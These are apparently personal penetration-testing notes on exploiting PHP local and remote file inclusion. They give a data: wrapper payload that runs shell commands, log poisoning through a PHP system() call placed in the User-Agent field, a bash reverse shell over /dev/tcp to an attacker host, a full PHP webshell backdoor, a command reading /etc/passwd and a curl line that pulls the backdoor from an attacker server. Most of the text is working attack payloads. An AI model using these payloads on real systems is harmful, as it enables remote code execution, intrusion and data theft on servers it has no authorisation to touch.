Check for Directory Traversals, LFI and RFI on php pages.
Consider inserting php code into log files and then running LFI exploits to run code.

SAMPLE LFI PHP WRAPPER PAYLOAD:
http://[IP]/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

### LFI
- Executing a file on the server, though we may have to modify it first somehow.  
- Ex: if the server stores access logs, modify the access log such that it contains our code, perhaps in the user agent field.
	1. Change this: "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
Firefox/91.0"
	2. To this: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>
	3. Then change the request to include "cmd=ls" to test
	4. \<server>/file.php?page=. . / . ./log&cmd=ls 
	- Note that it may need to be URL encoded if your command contains spaces i.e. ls&20-la for "ls -la"
	5. Then one liner shell:
		- `bash -c "bash -i >& /dev/tcp/$kaliIP/$kaliPort 0>&1"`
		- URL encoded though
	- On a Windows target running XAMPP, the Apache logs can be found in C:\xampp\apache\logs\.
	- On a Linux target Apacheâ€™s access.log file can be found in the /var/log/apache2/ directory.
- There are other examples of LFI, including uploading a reverse shell to a web application and calling it through the URL. The above is just one example of the concept. 

### RFI
- Executing on our file on the server. 
- In PHP web applications, the allow_url_include option needs to be enabled to leverage RFI. This is rare and disabled by default in current versions of PHP
 [Example backdoor script](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/php/simple-backdoor.php):

	<?php
	
	if(isset($_REQUEST['cmd'])){
	        echo "<pre>";
	        $cmd = ($_REQUEST['cmd']);
	        system($cmd);
	        echo "</pre>";
	        die;
	}
	
	?>
- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
- curl"\<target>/index.php?page=http://\<kali server>/backdoor.php&cmd=ls"
